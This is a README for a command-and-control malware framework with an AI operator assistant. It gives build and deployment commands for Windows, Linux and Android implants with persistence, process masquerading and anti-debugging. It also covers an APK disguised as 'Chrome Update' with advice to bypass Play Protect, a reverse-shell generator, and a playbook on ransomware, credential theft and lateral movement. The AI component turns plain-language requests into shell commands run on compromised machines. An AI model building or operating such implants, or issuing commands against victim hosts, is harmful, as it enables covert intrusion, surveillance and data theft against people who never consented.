# CYBERDEMONS C2 FRAMEWORK v3.0 — with AI integration

Multi-platform command and control framework with a cyberpunk-themed web UI,
targeting **Windows**, **Linux** and **Android**. Ships a payload builder, an
Android APK builder, a reverse-shell generator, and an **AI operator assistant**
that turns plain language into a single implant command — with a mandatory
approval step before anything executes.

All Windows/Linux C2 traffic uses **CYB3**: a PSK-authenticated ephemeral X25519
handshake followed by ChaCha20-Poly1305 frames with per-direction keys and replay
protection. The crypto is self-contained (`cybcrypt.h`) — no OpenSSL, no
libsodium — and is verified against published RFC test vectors.

> Authorized security testing and educational use only. See [Disclaimer](#disclaimer).

---

## Contents

- [AI integration](#ai-integration)
- [Features](#features)
- [Installation](#installation)
- [Quick start](#quick-start)
- [Usage](#usage)
- [CYB3 protocol](#cyb3-protocol)
- [Payload commands](#payload-commands)
- [Android](#android)
- [Reverse shell generator](#reverse-shell-generator)
- [AI API reference](#ai-api-reference)
- [Configuration](#configuration)
- [Verification](#verification)
- [Project structure](#project-structure)
- [Troubleshooting](#troubleshooting)
- [Disclaimer](#disclaimer)

---

## AI integration

The dashboard prompt box turns an operator's sentence into one command for the
selected implant. It runs in **two phases**, so you always see what is about to
execute before it does.

```
  "what files are in the current directory?"
                    │
                    ▼
        ┌─── PLAN ───────────────────────┐
        │  cybai.plan()                  │   NL  ->  one cmd.exe command
        │  model: local opencode service │   (nothing is sent to the target yet)
        └───────────────┬───────────────┘
                        ▼
        ┌─── APPROVE ────────────────────┐
        │  PROPOSED COMMAND — review it  │   RUN IT  /  CANCEL
        └───────────────┬───────────────┘
                        ▼
        ┌─── RUN ────────────────────────┐
        │  /api/ai/run                   │   1. send the command
        │                                │   2. on failure, re-plan once
        │                                │   3. summarise the output in English
        └────────────────────────────────┘
```

Both `/` (Windows/Linux clients) and `/android` have the panel. The health chip
in the panel header polls `/api/ai/health` every 15 seconds and shows the live
model and provider.

### What it actually does

| Capability | Where | Notes |
|---|---|---|
| Natural language → one command | `cybai.plan()` | Per-platform prompts. Windows targets `cmd.exe`; Android targets `/system/bin/sh -c`. |
| Mandatory operator approval | `templates/index.html` | Nothing reaches the implant until you press **RUN IT**. `Esc` cancels. |
| Self-correction on failure | `cybai.replan_after_failure()` | If the output matches a known error pattern, the model is given the error and the original request once more, and the corrected command is appended to the transcript. Bounded by `CYB_AI_REPLANS` (default 1). |
| Plain-English result summary | `cybai.interpret()` | Raw implant output is turned into a short answer, answer-first. Truncated to 6000 chars of feedback. |
| Reply sanitising | `cybai._clean_command()` | Strips markdown fences, prose and `Command:` prompt artefacts down to a single line. |
| Android command validation | `cybai._check_android()` | Rejects a *prefix* the implant would not recognise. A bare command is valid and is run through the device shell as-is. |
| Caching | `cybai._PLAN_CACHE` | 256-entry LRU-ish cache, cleared on every correction. |

The corrected command from a self-correction is always **shown in the
transcript**, never silently substituted, so the audit trail stays honest.

### Backed by your local `opencode` service

The model runs on your own machine. `cybai.py` discovers the service with
`opencode service status`, authenticates with HTTP Basic against
`~/.config/opencode/service.json`, and drives it over three endpoints:

```
POST /api/session                        -> {"data":{"id":"ses_..."}}
POST /api/session/{id}/prompt  {"text"}  -> 200, echoes the user message
GET  /api/session/{id}/message           -> assistant text in content[].text
```

Two traps are worth knowing, because both fail *silently* rather than erroring:

- **`Model.Ref` needs both `id` and `providerID`.** Missing either is a 400.
- **`id` must be the bare model id.** `"provider/model"` gets the provider
  prefixed a second time and the session dies with
  `ModelUnavailableError: Model unavailable: provider/provider/model`.
- **Replies arrive in `content`, not `parts`.** Polling `parts` returns empty
  forever and looks like a hang.

### Planning is stateless by default

Each plan starts a fresh session. This is deliberate: with a shared session the
model measurably drifts onto the previous turn's answer. Given three prompts in
one session, *"who am i running as"* returned `whoami /user`, and so did the
subsequent *"show me the hostname"*. With a fresh session per plan all three
came back correct.

Set `CYB_AI_CONTINUITY=1` to keep one conversation per client instead, which is
what you want for follow-ups like *"now the parent directory"*.

### AI configuration

| Variable | Default | Purpose |
|---|---|---|
| `CYB_AI_MODEL` | `space-bunny-free` | Bare model id — do **not** prefix with the provider. |
| `CYB_AI_PROVIDER` | `opencode` | Provider id. |
| `CYB_AI_AGENT` | `cyb-instructor` | opencode agent used for planning. |
| `CYB_AI_TIMEOUT` | `120` | Seconds to wait for a model reply. |
| `CYB_AI_REPLANS` | `1` | Self-corrections allowed per run. `0` disables. |
| `CYB_AI_CONTINUITY` | `0` | `1` keeps one session per client. |

The AI feature is entirely optional — the panel works fully without it.

---

## Features

**AI**
- NL → command planner with mandatory approval, one-shot self-correction, and English result summaries
- Works against both CYB3 clients (Windows/Linux) and Android devices
- Runs entirely on your local `opencode` service; no command leaves the panel without approval

**Implants**
- **Windows** (`pay.cpp`) — reverse shell, registry persistence, GDI screenshot, file transfer, process management, `msedge.exe` masquerading, `CYB_MINIMAL` compile-time capability strip
- **Linux** (`pay_linux.c`) — full command parity, 4 persistence methods (systemd, cron, rc, XDG), ptrace anti-debug, argv renaming, daemonization, X11 or ImageMagick screenshots
- **Android** (`apk_builder/`) — reverse-shell APK with WebView decoy, storage access, file download/upload, multi-device support

**Panel**
- **Web UI** (`web_listener.py`) — clients sidebar, terminal, file browser, history, multi-port listener management
- **Payload builder** (`/builder`) — configure C2 host/port, app name, icon; cross-compiles Windows (MinGW) or Linux (GCC), with optional build-time string encryption
- **Android APK builder** (`/android`) — builds and signs an APK, plus a live Android listener
- **Reverse shell generator** (`/shells`) — 19 one-liner payloads across 13 languages, with an inline netcat listener
- **CLI listeners** — `pythonlis.py` (CYB3) and `androidlistener.py` (Android)
- **Tunnels** — ngrok / bore.pub egress from the UI

**Stealth**
- Hidden console, process-name masquerading, optional build-time string encryption (`cybstrenc.py` → `cybstr.h`)

---

## Installation

The installer handles every dependency and then starts the panel.

```bash
git clone https://github.com/CYBERDEMON121/CYBERDEMONC2-V3-WITH-AI-INTEGRATION.git
cd CYBERDEMONC2-V3-WITH-AI-INTEGRATION
chmod +x install.sh
sudo ./install.sh
```

| Option | Effect |
|---|---|
| `--no-run` | Install only, do not start the panel |
| `--skip-android` | Skip the JDK + Android SDK (panel and implants only) |
| `--host <addr>` | Panel bind address (default `0.0.0.0`) |
| `--port <n>` | Panel web port (default `5000`) |
| `--no-venv` | Install Python packages system-wide, ignore `.venv` |

```bash
./install.sh --help
```

### What gets installed

| Component | Package | Required? |
|---|---|---|
| Panel | `flask` | **yes** — the only hard Python dependency |
| Linux payload | `gcc`, `libx11-dev`, `libcrypt-dev` | yes |
| Shell listener | `netcat-openbsd` | yes |
| Windows payload | `g++-mingw-w64-x86-64-posix`, `gcc-mingw-w64-x86-64-posix`, `binutils-mingw-w64-x86-64`, `mingw-w64-x86-64-dev`, `mingw-w64-common` | optional |
| APK builder | JDK 17+, Android SDK (platform `android-34`, build-tools `34.0.0`) | optional |
| AEAD accelerator | `cryptography` | optional — a pure-Python fallback exists |

Two notes the installer handles for you:

- **`x86_64-w64-mingw32-g++` is a binary name, not a package name.** Passing it to
  `apt` aborts the whole transaction with *"Unable to locate package"* and
  installs nothing. Install the per-target packages listed above.
- **Do not use the `mingw-w64` metapackage** for a win64-only setup — it pulls in
  the i686 cross-toolchain, which is dead weight. `posix` is preferred over
  `win32` because it gives full `<thread>`/`<mutex>`/`<std::future>` and correct
  C++11 threading semantics.

### Manual install

```bash
pip install flask            # the only required Python package
python3 web_listener.py
```

Optional, for the other targets:

```bash
# Windows cross-compiler
sudo apt install -y g++-mingw-w64-x86-64-posix gcc-mingw-w64-x86-64-posix \
    binutils-mingw-w64-x86-64 mingw-w64-x86-64-dev mingw-w64-common

# Linux payload
sudo apt install -y gcc libx11-dev libcrypt-dev netcat-openbsd

# APK builder
sudo apt install -y openjdk-17-jdk
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
export ANDROID_HOME=/opt/android-sdk
```

`generate_apk.py` autodetects the JDK by scanning `JAVA_HOME` and then
`/usr/lib/jvm/*` for the newest real JDK that actually ships a `bin/javac`, so a
system JDK is fine — a hardcoded `/opt/jdk-17.0.2` is not required.

---

## Quick start

```bash
python3 web_listener.py
```

- Web UI: `http://127.0.0.1:5000`
- C2 listeners: every enabled port in `data/listeners.json` (default `7777`)

On first run the panel generates `data/psk.json`, then **writes that PSK into
`pay.cpp` and `pay_linux.c`** so the builder bakes it into new payloads. The PSK
is a build-time constant — if you rotate it, rebuild your implants.

---

## Usage

### Build a payload

**Web UI:** `/builder` → set C2 host/port → pick Windows or Linux → Build → Download.

**Windows x64 (manual):**
```bash
x86_64-w64-mingw32-windres resources.rc -o resources.o
x86_64-w64-mingw32-g++ -m64 pay.cpp resources.o -o payload.exe \
  -lws2_32 -liphlpapi -lcrypt32 -lpsapi -lgdi32 -luser32 -s -O2 -mwindows
```

Confirm the output is genuinely 64-bit:
```bash
x86_64-w64-mingw32-objdump -f payload.exe | grep architecture   # -> i386:x86-64
x86_64-w64-mingw32-objdump -p payload.exe | grep 'DLL Name'     # system DLLs only
```

`-m64` is redundant for this toolchain (`x86_64-w64-mingw32` is x86-64 by
definition) but keeps the win64 target explicit. `-mwindows` links the GUI
subsystem so no console window appears.

**Linux (manual):**
```bash
gcc -o payload.elf pay_linux.c -lX11 -lpthread -lcrypt -ldl -lm -s -O2
gcc -DNO_X11 -o payload.elf pay_linux.c -lpthread -lcrypt -ldl -lm -s -O2
```

**Build-time string encryption:**
```bash
CYB_OBFUSCATE=1 ./cybtest/run_tests.sh        # re-run the suite obfuscated
python3 cybstrenc.py --key "$(cat /path/to/key)" --out cybstr.h
```

### Deploy

| Target | Command |
|---|---|
| Windows | run `payload.exe` — console hidden, masquerades as Microsoft Edge |
| Linux | `C2_HOST=<ip> C2_PORT=7777 ./payload.elf` |
| Android | install the APK, open the app, grant permissions |

The implant picks up its C2 endpoint in this order: **`cyb.cfg` sidecar →
environment variable → `argv[1]` → compiled-in default**.

---

## CYB3 protocol

1. The client sends `HELLO` carrying its X25519 public key and a 16-byte nonce,
   plus an HMAC tag proving it holds the panel's PSK. The tag is verified
   *before* the server performs any scalar multiplication, so an unauthenticated
   peer cannot drive the server through a handshake.
2. The server replies `HELLOACK` with its own key and nonce, tagged over the whole
   transcript — which stops a captured reply being replayed into a new session.
3. Both sides derive session keys:
   `HKDF-SHA256(ikm = psk || X25519_shared, salt = client_nonce || server_nonce)`
   and split that into independent client→server and server→client keys plus
   4-byte nonce prefixes.
4. Every frame is ChaCha20-Poly1305. The 12-byte header (magic, type, flags,
   sequence, length) is the AAD, so type, sequence and length are all
   authenticated.

| Property | Mechanism |
|---|---|
| Confidentiality | ChaCha20-Poly1305 (RFC 8439) |
| Integrity | Poly1305 tag over header + ciphertext |
| Forward secrecy | ephemeral X25519 mixed into the session key |
| Peer authentication | 32-byte pre-shared key, HMAC-verified |
| Replay protection | strictly increasing 32-bit sequence per direction |
| Reflection protection | separate keys and nonce prefixes per direction |
| Nonce safety | per-session random prefix + monotonic counter, never reused |
| Low-order key guard | an all-zero shared secret aborts the handshake |

### Frame layout

```
off  size  field
  0     2  magic 0xCB 0x03
  2     1  type
  3     1  flags
  4     4  seq        (big-endian)
  8     4  ct_len
 12    12  nonce      (4-byte session prefix || 8-byte counter)
 24     N  ciphertext
24+N   16  Poly1305 tag
```

Types: `HELLO 0x01` · `HELLOACK 0x02` · `CMD 0x10` · `RESP 0x11` ·
`PING 0x20` · `PONG 0x21` · `BYE 0x30` · `ERR 0x7F`. Header is 24 bytes, AAD is
12, tag is 16, max plaintext 16 MB.

Android implants use their own plaintext protocol (`RESULT:` / `ERR:` /
`FILEDATA:`) and are **not** encrypted or authenticated. Treat that channel as
untrusted.

### Keys

The panel keeps one PSK in `data/psk.json` (mode 0600) and writes it into both
payload sources so the builder bakes it in. `POST /api/builder/psk/rotate` issues
a new one; implants built against the old key fail every handshake.

> **This repository publishes its default PSK in source.** `data/psk.json` and
> the `PSK_HEX` constant in `pay.cpp` / `pay_linux.c` are identical and public.
> Anyone who can read them can authenticate to a listener using that key — so if
> you have ever run a real implant on a real network, **rotate the PSK and
> rebuild before doing anything else.**

---

## Payload commands

Identical verb surface on Windows and Linux; anything without a `!` prefix runs
through the system shell.

| Command | Windows | Linux |
|---|---|---|
| `<anything>` / `!shell <cmd>` | `cmd.exe /c` | `sh -c` |
| `!cd <dir>` / `!pwd` | yes | yes |
| `!ls [path]` | yes | yes |
| `!download <path>` | yes (max 10 MB) | yes (max 10 MB) |
| `!upload <path>` | yes (max 10 MB) | yes (max 10 MB) |
| `!ps` / `!kill <pid>` | yes | yes |
| `!screenshot` | GDI | X11 or ImageMagick |
| `!sysinfo` | yes | yes |
| `!persist` | HKCU Run | systemd + cron + rc + XDG |
| `!exit` / `!help` | yes | yes |

### Windows compile-time capability strip

`CYB_MINIMAL` and the `CYB_F_*` flags remove code, not just help text — the
`!help` output is generated from the same `#if` blocks, so the advertised surface
always matches the compiled binary.

| Flag | Removes |
|---|---|
| `CYB_F_FS` | `!ls`, `!download`, `!upload` |
| `CYB_F_PROC` | `!ps`, `!kill` |
| `CYB_F_SCREEN` | `!screenshot` |
| `CYB_F_SYSINFO` | `!sysinfo` |
| `CYB_F_PERSIST` | `!persist` |

```bash
x86_64-w64-mingw32-g++ -DCYB_MINIMAL -m64 pay.cpp resources.o -o payload.exe \
  -lws2_32 -liphlpapi -lcrypt32 -lpsapi -s -O2 -mwindows
```

The Linux implant has no equivalent strip.

---

## Android

**Build:** `/android` → configure → Build APK → Download, or:

```bash
python3 apk_builder/generate_apk.py \
  --c2-host YOUR_IP --c2-port 8080 \
  --target-url "https://www.google.com" \
  --app-name "Chrome Update" \
  --output cyberdemon_c2.apk
```

| Option | Description | Default |
|---|---|---|
| `--c2-host` | C2 server IP/hostname | (required) |
| `--c2-port` | C2 server port | `8080` |
| `--target-url` | URL loaded in the WebView decoy | `https://www.google.com` |
| `--app-name` | Label shown on the device | `Settings` |
| `--icon` | Custom PNG icon | generated default |
| `--output` | Output path | `cyberdemon_c2.apk` |
| `--package` | Android package name | `org.cyberdemon.c2` |

The builder generates `MainActivity.java` and `ReverseShell.java` itself, so the
whole `apk_builder/build/` tree is disposable output.

**Commands** — the implant runs each line through `/system/bin/sh -c` in its
current working directory, so **plain shell commands work directly**. A prefix is
only needed for the two file-transfer verbs.

| Form | Effect |
|---|---|
| `<any shell command>` | run through the device shell |
| `cd <path>` | change directory, persists between commands |
| `DOWNLOAD:<path>` | pull a file to the operator |
| `UPLOAD:<path>:<base64>` | push a file to the device |

Works without root on most devices. Default working directory is
`/storage/emulated/0`; output is capped at 10,000 characters and downloads at
10 MB. The app requests `READ/WRITE_EXTERNAL_STORAGE` and
`MANAGE_EXTERNAL_STORAGE` on first launch.

**Note on the AI planner and Android:** shell work is sent as a bare command —
`ls -la`, not a prefixed form. The planner only rejects a *prefix* that the
implant would not recognise, so a colon inside an argument
(`grep foo /sdcard/a:b`) is correctly treated as ordinary shell work.

---

## Reverse shell generator

`/shells` renders 19 payload templates; 13 are exposed in the dropdown.

Bash `/dev/tcp` · Netcat (traditional `-e` and mkfifo) · Socat · Telnet · Perl ·
Ruby · Lua · AWK · Python 2/3 · PHP (`exec` and `system`) · Node.js · Go ·
PowerShell · C# · Ncat with SSL · Java.

The page also embeds a listener: start a raw TCP listener on any port, watch the
session in a terminal pane, and type into it — all from the browser.

---

## AI API reference

| Route | Method | Purpose |
|---|---|---|
| `/api/ai/health` | GET | Readiness probe. Returns base URL, version, `provider/model`, agent. Polled by the UI every 15 s. |
| `/api/ai/plan` | POST | Natural language → one proposed command. **Does not touch the implant.** |
| `/api/ai/run` | POST | Execute an approved command, self-correct once if it failed, and return an English summary. |

```bash
# is the model reachable?
curl -s localhost:5000/api/ai/health | python3 -m json.tool

# what would it do? (nothing is executed)
curl -s -X POST localhost:5000/api/ai/plan \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>","prompt":"list the running processes","platform":"windows"}'

# Android variant
curl -s -X POST localhost:5000/api/ai/plan \
  -H 'Content-Type: application/json' \
  -d '{"client_id":"<id>","prompt":"how much free disk is there","platform":"android","port":8080}'
```

`/api/ai/run` responds with `answer` (English), `command` (as actually run),
`output`, and `steps` — the full list of commands attempted, so a self-correction
is visible rather than hidden.

---

## Configuration

| Variable | Default | Purpose |
|---|---|---|
| `CYB_WEB_HOST` | `0.0.0.0` | Panel bind address |
| `CYB_WEB_PORT` | `5000` | Panel web port |
| `CYB_CFG` | `cyb.cfg` | Sidecar config with `C2_HOST` / `C2_PORT` |
| `CYB_DEBUG` | unset | Log implant control flow to stderr |
| `CYB_NO_DAEMON` | unset | Keep the Linux implant in the foreground |
| `CYB_NO_WINDOW` | unset | Skip the hidden-console dance on Windows |
| `CYB_OBFUSCATE` | unset | Build with string encryption enabled |
| `CYB_STRING_KEY` | `cyberdemon` | Key for the build-time string encryption |
| `CYB_AI_*` | — | See [AI configuration](#ai-configuration) |

### Web UI routes

| Route | Description |
|---|---|
| `/` | C2 dashboard — clients, terminal, files, **AI panel** |
| `/builder` | Payload builder (Windows/Linux) + PSK rotation |
| `/android` | APK builder, Android listener, **AI panel** |
| `/shells` | Reverse shell generator + inline listener |

---

## Verification

```bash
./cybtest/run_tests.sh
```

Seven stages, cheapest first:

| Stage | What it proves |
|---|---|
| payload build | `pay_linux.c` and `pay.cpp` compile clean under `-Wall -Wextra` (gcc, gcc `-DNO_X11`, mingw-w64) |
| crypto vectors | SHA-256, HMAC, HKDF, ChaCha20, Poly1305, AEAD and X25519 against FIPS 180-4 / RFC 2104 / 4231 / 5869 / 8439 / 7748 |
| CYB3 protocol | handshake, framing, reassembly, and rejection of tampered, replayed, reflected and retyped frames |
| interop | the C implementation produces byte-identical output to Python's `cryptography` |
| backend parity | the accelerated AEAD path and the pure-Python fallback agree, and the fallback's X25519 matches RFC 7748 |
| implant e2e | a real compiled implant against a real Python listener: commands, 3 MB uploads, abuse handling |
| panel e2e | the real Flask panel driving a real implant: REST API, file transfer, key rotation cutting off stale implants |

Individual stages:
```bash
gcc -O2 -Wall -Wextra -o /tmp/crypto cybtest/crypto_selftest.c && /tmp/crypto
gcc -O2 -Wall -Wextra -o /tmp/proto  cybtest/proto_selftest.c  && /tmp/proto
python3 cybtest/proto_interop.py      # needs the 'cryptography' package
python3 cybtest/implant_test.py /tmp/payload.elf
python3 cybtest/panel_test.py
```

The interop and backend-parity stages skip cleanly when `cryptography` is not
installed.

> `panel_test.py` **rotates the PSK** when it finishes, rewriting `data/psk.json`
> and the `PSK_HEX` constants in both payload sources. Do not run it against a
> deployment you care about without a clean commit first.

---

## Project structure

```
CYBERDEMONC2-V3-WITH-AI-INTEGRATION/
├── install.sh                  # dependency installer + launcher
├── cybai.py                    # AI: NL -> command planner (local opencode service)
├── cybproto.h                  # CYB3 framing + handshake + replay guard
├── cybcrypt.h                  # SHA-256, HMAC, HKDF, ChaCha20-Poly1305, X25519
├── cybbuf.h                    # growable output buffer (kills snprintf truncation bugs)
├── cybc2.py                    # Python side of CYB3 (fast path + pure-Python fallback)
├── cybstrenc.py                # build-time literal encryption -> cybstr.h
├── pay.cpp                     # Windows implant (C++)
├── pay_linux.c                 # Linux implant (C)
├── web_listener.py             # panel: listener, builder, APK builder, AI bridge
├── pythonlis.py                # CLI CYB3 listener
├── androidlistener.py          # CLI Android listener
├── cyb.cfg                     # C2 endpoint sidecar
├── resources.rc / app.ico      # payload icon resources
├── opencode.json                # agent + permission config for the AI service
├── docs/malware/               # offensive engineering playbook (8 documents)
│   ├── README.md               # index, capability gap matrix, ATT&CK map
│   ├── evasion.md              # anti-analysis, anti-VM, packing, AMSI/ETW
│   ├── persistence.md          # run keys, services, tasks, WMI, systemd, cron
│   ├── injection.md            # DLL injection, hollowing, APC, thread hijack
│   ├── credentials.md          # LSASS, SAM, DPAPI, tokens, keylogging
│   ├── ransomware.md           # encryption, key management, double extortion
│   ├── lateral-movement.md     # SMB, WinRM, WMI, DCOM, SSH, pivoting
│   └── simulation.md           # scope, lab setup, opsec, detection validation
├── cybtest/                    # verification suite
│   ├── run_tests.sh            # 7-stage entry point
│   ├── crypto_selftest.c       # RFC vectors
│   ├── proto_selftest.c        # framing / replay / tamper
│   ├── proto_emit.c            # C side of the interop check
│   ├── proto_interop.py        # C output vs Python `cryptography`
│   ├── implant_test.py         # real implant vs real listener
│   └── panel_test.py           # real panel vs real implant
├── templates/
│   ├── index.html              # dashboard: clients, terminal, files, AI panel
│   ├── builder.html            # payload builder
│   ├── android.html            # APK builder + Android listener + AI panel
│   └── shells.html             # reverse shell generator
├── apk_builder/
│   └── generate_apk.py         # aapt2 -> javac -> d8 -> zipalign -> apksigner
├── static/                     # UI assets
└── data/                       # psk.json, listeners.json, victims.json
```

`build_output/`, `apk_builder/build/`, `clients/` and `android_clients/` are
runtime output and are not tracked. `build_keys/` holds signing material — the
private key is git-ignored.

### Playbook

`docs/malware/` is a working reference, not decoration: each document explains
how a technique works, how it is detected, and how to prove you implemented it.
`docs/malware/README.md` carries a capability gap matrix and an ATT&CK map. The
largest open gaps it names are process injection (T1055), credential access
(T1003/T1056) and ransomware simulation (T1486).

---

## Troubleshooting

**AI panel says "unreachable"** — the model runs on a local service, not on the
panel host by default. Check `opencode service status`, and
`~/.config/opencode/service.json` for the password. If the model id is wrong you
get a 400 that mentions `Model.Ref`; if it is double-prefixed you get
`Model unavailable: provider/provider/model`.

**AI always proposes the same command** — you are in continuity mode and the
model is drifting onto the previous turn. Unset `CYB_AI_CONTINUITY`.

**APK build fails** — confirm `javac` and `keytool` exist (a JRE is not enough;
`generate_apk.py` needs a real JDK), that `ANDROID_HOME` contains
`build-tools/34.0.0`, and that `platforms/android-34/android.jar` is present.
The error lists the specific missing pieces.

**"Unsafe App" warning on Android** — Play Protect flagging a self-signed APK.
Tap *More details* → *Install anyway*.

**Storage permission denied** — the app requests it on first launch. If denied,
go to Settings → Apps → [App Name] → Permissions → Storage.

**Implant connects but every command fails** — the PSK in the payload does not
match the panel's. The panel writes its PSK into the sources on startup, so
rebuild after any rotation.

---

## Disclaimer

For authorized security testing and educational purposes only. Unauthorized
access to computer systems is illegal. The authors assume no liability for
misuse.

`Malware-Development/` is a vendored copy of third-party educational material
(MIT © 2025 ASTRA Labs) and retains its original licence and attribution.
